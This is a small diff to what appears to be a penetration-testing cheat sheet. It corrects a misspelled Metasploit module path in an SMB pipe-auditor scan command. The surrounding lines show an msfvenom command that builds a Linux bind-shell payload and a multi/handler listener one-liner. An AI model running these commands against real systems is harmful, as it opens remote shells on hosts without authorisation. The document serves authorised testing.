@@ -26,7 +26,7 @@ msfvenom -p linux/shell/bind_tcp RHOST=0.0.0.0 RPORT=1337 -f elf-so > bind_shell
 msfconsole -x "use exploit/multi/handler ; set PAYLOAD <payload> ; set  VAR1 value1 ; set VAR2 value2 ; exploit ; exit -y;"
 ```
 ```bash
-msfconsole -x "use auxilliary/scanner/smb/pipe_auditor ; set RHOST <ip> ; exploit ; exit -y;"
+msfconsole -x "use auxiliary/scanner/smb/pipe_auditor ; set RHOST <ip> ; exploit ; exit -y;"
 ```
 
 
